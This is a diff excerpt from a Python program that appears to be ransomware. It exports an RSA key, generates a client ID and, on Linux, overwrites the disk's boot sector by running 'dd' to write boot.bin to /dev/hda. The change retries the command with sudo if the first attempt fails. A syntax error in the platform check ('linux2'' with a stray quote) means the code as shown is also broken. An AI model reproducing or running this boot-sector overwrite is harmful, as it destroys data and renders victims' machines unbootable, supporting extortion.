@@ -16,9 +16,14 @@ exKey = RSA.exportKey('PEM')
 
 if sys.platform == 'linux2'':
 	try:
-		os.system("sudo dd if=boot.bin of=/dev/hda bs=512 count=1")
+		os.system("dd if=boot.bin of=/dev/hda bs=512 count=1")
+		os.system("sleep 1 && exit")
 	except:
-		pass
+		try:	
+			os.system("sudo dd if=boot.bin of=/dev/hda bs=512 count=1")
+			os.system("sleep 1 && exit")
+		except:
+			pass
 
 def gen_client_ID(size=12, chars=string.ascii_uppercase + string.digits):
 	global ID
